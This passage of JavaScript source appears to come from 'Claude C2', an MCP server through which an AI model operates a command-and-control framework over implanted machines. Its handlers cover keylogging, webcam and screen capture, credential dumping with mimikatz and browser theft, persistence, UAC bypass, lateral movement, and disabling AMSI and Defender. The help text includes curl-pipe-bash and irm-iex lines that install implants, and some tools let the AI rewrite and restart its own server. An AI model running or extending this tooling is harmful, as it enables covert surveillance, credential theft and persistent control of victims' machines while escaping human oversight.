        const cmdResult = await sendCmd('file_list', { path: args.path || '.' });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'cat') {
        const cmdResult = await sendCmd('file_read', { path: args.path });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'write') {
        const cmdResult = await sendCmd('file_write', { path: args.path, content: args.content });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'download') {
        if (!fs.existsSync(downloadDir)) fs.mkdirSync(downloadDir, { recursive: true });
        const cmdResult = await sendCmd('file_read_b64', { path: args.remote_path }, 120000);
        if (cmdResult.success && cmdResult.b64) {
          const filename = args.local_path || path.join(downloadDir, `${args.client_id}_${path.basename(args.remote_path)}`);
          fs.writeFileSync(filename, Buffer.from(cmdResult.b64, 'base64'));
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, saved: filename, size: fs.statSync(filename).size }, null, 2) }] };
        } else {
          result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
        }
      } else if (name === 'upload') {
        const content = fs.readFileSync(args.local_path);
        const b64 = content.toString('base64');
        const cmdResult = await sendCmd('file_write_b64', { path: args.remote_path, b64 }, 120000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'rm') {
        const cmdResult = await sendCmd('file_delete', { path: args.path, recursive: args.recursive });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'mkdir') {
        const cmdResult = await sendCmd('mkdir', { path: args.path });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'cp') {
        const cmdResult = await sendCmd('file_copy', { src: args.src, dst: args.dst });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'mv') {
        const cmdResult = await sendCmd('file_move', { src: args.src, dst: args.dst });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'search') {
        const cmdResult = await sendCmd('file_search', { path: args.path || '.', pattern: args.pattern, recursive: args.recursive }, 120000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'zip') {
        const cmdResult = await sendCmd('zip', { src: args.src, dst: args.dst }, 120000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === SCREENSHOT & SURVEILLANCE ===
      else if (name === 'screenshot') {
        if (!fs.existsSync(screenshotDir)) fs.mkdirSync(screenshotDir, { recursive: true });
        const cmdResult = await sendCmd('screenshot', {}, 60000);
        if (cmdResult.success && cmdResult.b64) {
          const filename = path.join(screenshotDir, `${args.client_id}_${Date.now()}.png`);
          fs.writeFileSync(filename, Buffer.from(cmdResult.b64, 'base64'));
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, saved: filename, size: fs.statSync(filename).size }, null, 2) }] };
        } else {
          result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
        }
      } else if (name === 'webcam') {
        if (!fs.existsSync(screenshotDir)) fs.mkdirSync(screenshotDir, { recursive: true });
        const cmdResult = await sendCmd('webcam', {}, 60000);
        if (cmdResult.success && cmdResult.b64) {
          const filename = path.join(screenshotDir, `${args.client_id}_webcam_${Date.now()}.jpg`);
          fs.writeFileSync(filename, Buffer.from(cmdResult.b64, 'base64'));
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, saved: filename, size: fs.statSync(filename).size }, null, 2) }] };
        } else {
          result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
        }
      } else if (name === 'keylog_start') {
        const cmdResult = await sendCmd('keylog_start', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'keylog_dump') {
        const cmdResult = await sendCmd('keylog_dump', {});
        if (cmdResult.success && cmdResult.keys) {
          saveLoot(`${args.client_id}_keylog_${Date.now()}.txt`, cmdResult.keys);
        }
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'keylog_stop') {
        const cmdResult = await sendCmd('keylog_stop', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'clipboard') {
        const cmdResult = await sendCmd('clipboard', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === CREDENTIAL ACCESS ===
      else if (name === 'hashdump') {
        const cmdResult = await sendCmd('hashdump', {}, 120000);
        if (cmdResult.success) saveLoot(`${args.client_id}_hashes_${Date.now()}.txt`, cmdResult.hashes || cmdResult);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'mimikatz') {
        const cmdResult = await sendCmd('mimikatz', { cmd: args.cmd }, 120000);
        if (cmdResult.success) saveLoot(`${args.client_id}_mimikatz_${Date.now()}.txt`, cmdResult.output || cmdResult);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'browser_creds') {
        const cmdResult = await sendCmd('browser_creds', { browser: args.browser || 'all' }, 120000);
        if (cmdResult.success) saveLoot(`${args.client_id}_browser_creds_${Date.now()}.json`, cmdResult);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'wifi_passwords') {
        const cmdResult = await sendCmd('wifi_passwords', {});
        if (cmdResult.success) saveLoot(`${args.client_id}_wifi_${Date.now()}.txt`, cmdResult);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'vault_creds') {
        const cmdResult = await sendCmd('vault_creds', {});
        if (cmdResult.success) saveLoot(`${args.client_id}_vault_${Date.now()}.json`, cmdResult);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === PERSISTENCE ===
      else if (name === 'persist_registry') {
        const cmdResult = await sendCmd('persist_registry', { name: args.name, command: args.command, hive: args.hive || 'HKCU' });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'persist_schtask') {
        const cmdResult = await sendCmd('persist_schtask', { name: args.name, command: args.command, trigger: args.trigger || 'onlogon' });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'persist_service') {
        const cmdResult = await sendCmd('persist_service', { name: args.name, binary_path: args.binary_path });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'persist_startup') {
        const cmdResult = await sendCmd('persist_startup', { name: args.name, command: args.command });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'persist_wmi') {
        const cmdResult = await sendCmd('persist_wmi', { name: args.name, command: args.command });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'persist_list') {
        const cmdResult = await sendCmd('persist_list', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'persist_remove') {
        const cmdResult = await sendCmd('persist_remove', { type: args.type, name: args.name });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === PRIVILEGE ESCALATION ===
      else if (name === 'privesc_check') {
        const cmdResult = await sendCmd('privesc_check', {}, 120000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'getsystem') {
        const cmdResult = await sendCmd('getsystem', { technique: args.technique || 'auto' });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'runas') {
        const cmdResult = await sendCmd('runas', { user: args.user, password: args.password, domain: args.domain, cmd: args.cmd });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'bypassuac') {
        const cmdResult = await sendCmd('bypassuac', { technique: args.technique || 'auto' });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === LATERAL MOVEMENT ===
      else if (name === 'portscan') {
        const cmdResult = await sendCmd('portscan', { target: args.target, ports: args.ports }, 300000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'netscan') {
        const cmdResult = await sendCmd('netscan', { subnet: args.subnet }, 300000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'psexec') {
        const cmdResult = await sendCmd('psexec', { target: args.target, user: args.user, password: args.password, cmd: args.cmd }, 120000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'wmiexec') {
        const cmdResult = await sendCmd('wmiexec', { target: args.target, user: args.user, password: args.password, cmd: args.cmd }, 120000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'winrm') {
        const cmdResult = await sendCmd('winrm', { target: args.target, user: args.user, password: args.password, cmd: args.cmd }, 120000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'ssh_exec') {
        const cmdResult = await sendCmd('ssh_exec', { target: args.target, user: args.user, password: args.password, key: args.key, cmd: args.cmd }, 120000);
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === DEFENSE EVASION ===
      else if (name === 'amsi_bypass') {
        const cmdResult = await sendCmd('amsi_bypass', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'etw_patch') {
        const cmdResult = await sendCmd('etw_patch', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'defender_exclude') {
        const cmdResult = await sendCmd('defender_exclude', { path: args.path });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'defender_status') {
        const cmdResult = await sendCmd('defender_status', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'firewall_status') {
        const cmdResult = await sendCmd('firewall_status', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'firewall_rule') {
        const cmdResult = await sendCmd('firewall_rule', { action: args.action, name: args.name, port: args.port, protocol: args.protocol });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'timestomp') {
        const cmdResult = await sendCmd('timestomp', { path: args.path, reference: args.reference });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === PROCESS OPERATIONS ===
      else if (name === 'kill') {
        const cmdResult = await sendCmd('kill', { pid: args.pid, name: args.name });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'inject') {
        const cmdResult = await sendCmd('inject', { pid: args.pid, shellcode_b64: args.shellcode_b64 });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'spawn') {
        const cmdResult = await sendCmd('spawn', { path: args.path, args: args.args, hidden: args.hidden });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === REGISTRY ===
      else if (name === 'reg_read') {
        const cmdResult = await sendCmd('reg_read', { path: args.path, name: args.name });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'reg_write') {
        const cmdResult = await sendCmd('reg_write', { path: args.path, name: args.name, value: args.value, type: args.type || 'REG_SZ' });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'reg_delete') {
        const cmdResult = await sendCmd('reg_delete', { path: args.path, name: args.name });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === MCP SELF-EDIT TOOLS ===
      else if (name === 'mcp_read_source') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          let filePath = args.file;
          if (!filePath.startsWith('/')) filePath = path.join(mcpRoot, filePath);
          if (filePath.startsWith(mcpRoot)) {
            const content = fs.readFileSync(filePath, 'utf8');
            const lines = content.split('\n');
            result = { content: [{ type: 'text', text: JSON.stringify({ success: true, file: filePath, lines: lines.length, content }, null, 2) }] };
          } else {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'Access denied - file outside project' }, null, 2) }] };
          }
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'mcp_edit_code') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          let filePath = args.file;
          if (!filePath.startsWith('/')) filePath = path.join(mcpRoot, filePath);
          if (filePath.startsWith(mcpRoot)) {
            let content = fs.readFileSync(filePath, 'utf8');
            if (!content.includes(args.find)) {
              result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'Text not found in file' }, null, 2) }] };
            } else {
              const newContent = content.replace(args.find, args.replace);
              fs.writeFileSync(filePath, newContent);
              result = { content: [{ type: 'text', text: JSON.stringify({ success: true, file: filePath, message: 'Code updated. Use mcp_restart to apply changes.' }, null, 2) }] };
            }
          } else {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'Access denied' }, null, 2) }] };
          }
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'mcp_write_file') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          let filePath = args.file;
          if (!filePath.startsWith('/')) filePath = path.join(mcpRoot, filePath);
          if (filePath.startsWith(mcpRoot)) {
            const dir = path.dirname(filePath);
            if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
            fs.writeFileSync(filePath, args.content);
            result = { content: [{ type: 'text', text: JSON.stringify({ success: true, file: filePath, size: args.content.length, message: 'File written. Use mcp_restart if server code changed.' }, null, 2) }] };
          } else {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'Access denied' }, null, 2) }] };
          }
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'mcp_append_code') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          let filePath = args.file;
          if (!filePath.startsWith('/')) filePath = path.join(mcpRoot, filePath);
          if (filePath.startsWith(mcpRoot)) {
            let content = fs.readFileSync(filePath, 'utf8');
            if (args.before && content.includes(args.before)) {
              content = content.replace(args.before, args.code + '\n' + args.before);
            } else {
              content += '\n' + args.code;
            }
            fs.writeFileSync(filePath, content);
            result = { content: [{ type: 'text', text: JSON.stringify({ success: true, file: filePath, message: 'Code appended. Use mcp_restart to apply.' }, null, 2) }] };
          } else {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'Access denied' }, null, 2) }] };
          }
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'mcp_list_source') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          const subPath = args.path ? path.join(mcpRoot, args.path) : mcpRoot;
          const getAllFiles = (dir, files = []) => {
            const items = fs.readdirSync(dir);
            for (const item of items) {
              if (item === 'node_modules' || item === '.git') continue;
              const fullPath = path.join(dir, item);
              const stat = fs.statSync(fullPath);
              if (stat.isDirectory()) {
                getAllFiles(fullPath, files);
              } else {
                files.push({ path: fullPath.replace(mcpRoot + '/', ''), size: stat.size, modified: stat.mtime });
              }
            }
            return files;
          };
          const files = getAllFiles(subPath);
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, root: mcpRoot, files }, null, 2) }] };
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'mcp_restart') {
        const delay = args.delay || 2;
        // Schedule restart
        setTimeout(() => {
          const { exec } = require('child_process');
          exec('sudo /bin/systemctl restart claude-c2', (err) => {
            if (err) log('[MCP] Restart failed: ' + err.message);
          });
        }, delay * 1000);
        result = { content: [{ type: 'text', text: JSON.stringify({ success: true, message: `Server will restart in ${delay} seconds. Reconnect after restart.` }, null, 2) }] };
      }
      else if (name === 'mcp_backup') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          const backupDir = '/home/iozac/mcp-backups';
          const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
          const backupPath = path.join(backupDir, timestamp);
          if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
          fs.mkdirSync(backupPath);
          // Backup key files
          const filesToBackup = args.files || ['src/server.js', 'agents/windows.ps1', 'agents/linux.sh', 'agents/termux.sh', 'agents/agent.py', '.env'];
          for (const file of filesToBackup) {
            const src = path.join(mcpRoot, file);
            if (fs.existsSync(src)) {
              const dst = path.join(backupPath, file);
              const dstDir = path.dirname(dst);
              if (!fs.existsSync(dstDir)) fs.mkdirSync(dstDir, { recursive: true });
              fs.copyFileSync(src, dst);
            }
          }
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, backup_id: timestamp, path: backupPath, files: filesToBackup }, null, 2) }] };
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'mcp_restore') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          const backupPath = path.join('/home/iozac/mcp-backups', args.backup_id);
          if (!fs.existsSync(backupPath)) {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'Backup not found' }, null, 2) }] };
          } else {
            const copyRecursive = (src, dst) => {
              const items = fs.readdirSync(src);
              for (const item of items) {
                const srcPath = path.join(src, item);
                const dstPath = path.join(dst, item);
                const stat = fs.statSync(srcPath);
                if (stat.isDirectory()) {
                  if (!fs.existsSync(dstPath)) fs.mkdirSync(dstPath, { recursive: true });
                  copyRecursive(srcPath, dstPath);
                } else {
                  fs.copyFileSync(srcPath, dstPath);
                }
              }
            };
            copyRecursive(backupPath, mcpRoot);
            result = { content: [{ type: 'text', text: JSON.stringify({ success: true, message: 'Restored from backup. Use mcp_restart to apply.' }, null, 2) }] };
          }
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'mcp_logs') {
        try {
          const { execSync } = require('child_process');
          const lines = args.lines || 50;
          let cmd = `journalctl -u claude-c2 -n ${lines} --no-pager`;
          if (args.filter) cmd += ` | grep -i "${args.filter}"`;
          const output = execSync(cmd, { encoding: 'utf8', timeout: 10000 });
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, logs: output }, null, 2) }] };
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'mcp_add_tool') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          const serverPath = path.join(mcpRoot, 'src/server.js');
          let content = fs.readFileSync(serverPath, 'utf8');

          // Add to tools list
          const toolDef = `          { name: '${args.name}', description: '${args.description}', inputSchema: ${JSON.stringify(args.input_schema || { type: 'object', properties: {} })} },`;
          const toolsListMarker = '// === LOOT MANAGEMENT ===';
          content = content.replace(toolsListMarker, toolDef + '\n          ' + toolsListMarker);

          // Add handler
          const handlerCode = `
      else if (name === '${args.name}') {
        try {
          ${args.handler_code}
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }`;
          const handlerMarker = '// === LOOT MANAGEMENT ===\n      else if';
          content = content.replace(handlerMarker, '// === LOOT MANAGEMENT ===' + handlerCode + '\n      else if');

          fs.writeFileSync(serverPath, content);
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, tool: args.name, message: 'Tool added. Use mcp_restart to apply.' }, null, 2) }] };
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'mcp_config') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          const envPath = path.join(mcpRoot, '.env');
          if (args.action === 'get') {
            if (fs.existsSync(envPath)) {
              const content = fs.readFileSync(envPath, 'utf8');
              const config = {};
              content.split('\n').forEach(line => {
                if (line && !line.startsWith('#')) {
                  const [key, ...val] = line.split('=');
                  if (key) config[key.trim()] = val.join('=').trim();
                }
              });
              if (args.key) {
                result = { content: [{ type: 'text', text: JSON.stringify({ success: true, key: args.key, value: config[args.key] }, null, 2) }] };
              } else {
                result = { content: [{ type: 'text', text: JSON.stringify({ success: true, config }, null, 2) }] };
              }
            } else {
              result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'Config file not found' }, null, 2) }] };
            }
          } else if (args.action === 'set' && args.key && args.value !== undefined) {
            let content = fs.existsSync(envPath) ? fs.readFileSync(envPath, 'utf8') : '';
            const regex = new RegExp(`^${args.key}=.*$`, 'm');
            if (regex.test(content)) {
              content = content.replace(regex, `${args.key}=${args.value}`);
            } else {
              content += `\n${args.key}=${args.value}`;
            }
            fs.writeFileSync(envPath, content);
            result = { content: [{ type: 'text', text: JSON.stringify({ success: true, key: args.key, value: args.value, message: 'Config updated. Restart to apply.' }, null, 2) }] };
          } else {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'Invalid action or missing parameters' }, null, 2) }] };
          }
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }

      // === HELP & DOCUMENTATION ===
      else if (name === 'help') {
        const topic = (args.topic || 'overview').toLowerCase();
        const helpTopics = {
          overview: `
# Claude C2 - C2 Framework

A Model Context Protocol (MCP) based Command & Control framework that integrates with Claude AI.

## Quick Start
- List clients: Use 'list_clients' tool
- Execute command: Use 'shell' tool with client_id and cmd
- Take screenshot: Use 'screenshot' tool with client_id
- Get help on topic: Use 'help' tool with topic parameter

## Available Topics
- tools: List all available tools by category
- agents: Information about agent payloads
- architecture: System architecture overview
- api: REST API endpoints
- examples: Usage examples
- Or use any tool name for specific help

## Key Tools
- list_clients, shell, powershell, screenshot, download, upload
- sysinfo, netinfo, pslist, browser_creds, wifi_passwords
- persist_*, privesc_check, portscan, netscan
- mcp_* tools for self-modification

## Server Info
- Server URL: https://${DOMAIN}
- WebSocket: ws://${DOMAIN}:3103
- Agents page: https://${DOMAIN}/agents
`,
          tools: `
# Available Tools by Category

## Client Management
- list_clients: List all connected implants
- client_info: Get details about specific client

## Execution
- shell: Execute shell command (cmd.exe/bash)
- powershell: Execute PowerShell (Windows)
- execute_assembly: Load .NET assembly in memory

## Reconnaissance
- sysinfo, netinfo, pslist, services
- installed_software, scheduled_tasks, startup_programs
- domain_info, local_users, shares

## File Operations
- ls, cat, write, download, upload
- rm, mkdir, cp, mv, search, zip

## Surveillance
- screenshot, webcam, keylog_start/stop/dump, clipboard

## Credential Access
- hashdump, mimikatz, browser_creds, wifi_passwords, vault_creds

## Persistence
- persist_registry, persist_schtask, persist_service
- persist_startup, persist_wmi, persist_list, persist_remove

## Privilege Escalation
- privesc_check, getsystem, bypassuac, runas

## Lateral Movement
- portscan, netscan, psexec, wmiexec, winrm, ssh_exec

## Defense Evasion
- amsi_bypass, etw_patch, defender_exclude/status
- firewall_status/rule, timestomp

## MCP Self-Edit
- mcp_read_source, mcp_edit_code, mcp_write_file
- mcp_restart, mcp_backup, mcp_restore, mcp_add_tool

## Payload Generation
- get_payload, generate_payload, list_payloads
`,
          agents: `
# Agent Payloads

## Supported Platforms
- Windows (PowerShell) - Full feature support
- Linux (Bash/Python) - Full feature support
- macOS (Bash/Python) - Full feature support
- Android/Termux - Most features supported

## Deployment Commands

### Windows
\`\`\`powershell
irm https://${DOMAIN}/agent/windows | iex
\`\`\`

### Linux
\`\`\`bash
curl -s https://${DOMAIN}/agent/linux | bash
\`\`\`

### macOS
\`\`\`bash
curl -s https://${DOMAIN}/agent/macos | bash
\`\`\`

### Termux (Android)
\`\`\`bash
curl -s https://${DOMAIN}/agent/termux | bash
\`\`\`

### Python (Cross-platform)
\`\`\`bash
curl -s https://${DOMAIN}/agent/python -o agent.py
python3 agent.py --id MYDEVICE
\`\`\`

## Use get_payload tool to retrieve payload code
`,
          architecture: `
# System Architecture

\`\`\`
┌─────────────────┐     MCP/SSE      ┌─────────────────┐     WebSocket     ┌─────────────────┐
│   Claude.ai     │ ◄──────────────► │   C2 Server     │ ◄───────────────► │   Implants      │
│   (Operator)    │                  │   (VPS)         │                   │   (Targets)     │
└─────────────────┘                  └─────────────────┘                   └─────────────────┘
\`\`\`

## Components

### C2 Server (Node.js)
- Location: /home/iozac/claude-c2/
- Main file: src/server.js
- Config: .env
- Service: claude-c2.service

### Communication
- MCP: HTTP/SSE on port 443 (via nginx)
- WebSocket: WSS on port 3102
- Authentication: OAuth 2.0 + shared secret

### File Structure
- src/server.js - Main server with MCP tools
- agents/*.ps1|sh|py - Platform-specific payloads
- config/ - Configuration templates
- docs/ - Documentation

## Key Functions in server.js
- ClientManager: Manages connected clients
- sendCmd(): Send command to client
- saveLoot(): Save exfiltrated data
- MCP handlers: Process tool calls
`,
          api: `
# REST API Endpoints

## Health & Status
- GET /health - Server health check
- GET /test/clients - List connected clients

## Commands
- POST /test/command - Send command to client
  Body: { client_id, command, args }

## Agent Downloads
- GET /agent/windows - Windows PowerShell agent
- GET /agent/linux - Linux Bash agent
- GET /agent/macos - macOS agent
- GET /agent/termux - Termux agent
- GET /agent/python - Cross-platform Python agent
- GET /agents - Agent download page (HTML)

## MCP Endpoints
- GET /mcp/sse - SSE connection
- POST /mcp/sse - MCP JSON-RPC calls

## OAuth
- GET /oauth/authorize - OAuth authorization
- POST /oauth/token - Token exchange
`,
          examples: `
# Usage Examples

## Basic Operations
"List all connected clients"
"Get system info from LAPTOP01"
"Execute 'whoami' on WORKSTATION"

## File Operations
"List files in C:\\Users on LAPTOP01"
"Download the file C:\\secrets.txt from TARGET"
"Search for *.docx files on DESKTOP-PC"

## Surveillance
"Take a screenshot on LAPTOP01"
"Start keylogger on TARGET"
"Get clipboard contents from WORKSTATION"

## Credentials
"Extract browser passwords from LAPTOP01"
"Get WiFi passwords from TARGET"
"Run mimikatz sekurlsa::logonpasswords on ADMIN-PC"

## Persistence
"Add registry persistence on LAPTOP01"
"Create a scheduled task for persistence on TARGET"

## Network
"Scan ports 22,80,443,445,3389 on 192.168.1.100 from LAPTOP01"
"Scan the 192.168.1.0/24 network from TARGET"

## MCP Self-Modification
"Show me the project structure"
"Read the server.js source code"
"Add a new tool called 'ping_host' that pings a target"
"Restart the server to apply changes"
`
        };

        let helpText = helpTopics[topic] || helpTopics.overview;
        if (!helpTopics[topic] && topic !== 'overview') {
          // Check if it's a tool name
          helpText = `Tool '${topic}' - Use tool_docs for detailed documentation on specific tools.`;
        }
        result = { content: [{ type: 'text', text: helpText }] };
      }
      else if (name === 'project_info') {
        const projectInfo = {
          name: 'Claude C2',
          version: '2.0.0',
          description: 'MCP-based C2 Framework for Red Team Operations',
          tested_platforms: ['Windows 11', 'Termux (Android)', 'Ubuntu 22.04'],

          project_root: '/home/iozac/claude-c2',

          structure: {
            'src/server.js': 'Main MCP server - Express + WebSocket, all tool handlers',
            'agents/windows.ps1': 'Windows PowerShell agent',
            'agents/linux.sh': 'Linux Bash/Python agent',
            'agents/macos.sh': 'macOS agent',
            'agents/termux.sh': 'Android Termux agent',
            'agents/agent.py': 'Cross-platform Python agent',
            'agents/index.html': 'Agent download page',
            '.env': 'Configuration (secrets, ports)',
            'docs/': 'Documentation files',
            'config/': 'Nginx, systemd configs'
          },

          server_architecture: {
            framework: 'Express.js with ES Modules',
            websocket: 'ws library on port 3101',
            mcp_transport: 'SSE (Server-Sent Events)',
            authentication: 'OAuth 2.0 for MCP, shared secret for agents',
            proxy: 'Nginx for SSL termination'
          },

          key_components: {
            ClientManager: 'Class managing connected clients, pending commands, history',
            'sendCmd()': 'Helper function to send commands to clients',
            'saveLoot()': 'Helper to save exfiltrated data to /home/iozac/loot',
            'MCP POST /mcp/sse': 'Main handler for all MCP tool calls'
          },

          tool_categories: [
            'Client Management (list_clients, client_info)',
            'Execution (shell, powershell, execute_assembly)',
            'Reconnaissance (sysinfo, netinfo, pslist, services, etc)',
            'File Operations (ls, cat, write, download, upload, etc)',
            'Surveillance (screenshot, webcam, keylogger, clipboard)',
            'Credential Access (hashdump, mimikatz, browser_creds, etc)',
            'Persistence (registry, schtask, service, startup, wmi)',
            'Privilege Escalation (privesc_check, getsystem, bypassuac)',
            'Lateral Movement (portscan, netscan, psexec, wmiexec, etc)',
            'Defense Evasion (amsi_bypass, etw_patch, defender, firewall)',
            'MCP Self-Edit (read, edit, write, restart, backup, add_tool)',
            'Help & Docs (help, project_info, tool_docs)',
            'Payloads (get_payload, generate_payload, list_payloads)',
            'Loot Management (loot_list, loot_download)'
          ],

          adding_new_tools: {
            step1: 'Add tool definition to tools array in tools/list handler',
            step2: 'Add else if handler in tools/call section',
            step3: 'Use mcp_restart to apply changes',
            example: 'Use mcp_add_tool for automated tool addition'
          },

          important_paths: {
            server_source: '/home/iozac/claude-c2/src/server.js',
            env_config: '/home/iozac/claude-c2/.env',
            logs: 'journalctl -u claude-c2',
            backups: '/home/iozac/mcp-backups/',
            loot: '/home/iozac/loot/',
            screenshots: '/home/iozac/screenshots/',
            downloads: '/home/iozac/downloads/'
          },

          urls: {
            server: 'https://${DOMAIN}',
            websocket: 'ws://${DOMAIN}:3103',
            mcp_endpoint: 'https://${DOMAIN}/mcp/sse',
            agents_page: 'https://${DOMAIN}/agents'
          },

          github: 'https://github.com/0xyg3n/claude-c2'
        };
        result = { content: [{ type: 'text', text: JSON.stringify(projectInfo, null, 2) }] };
      }
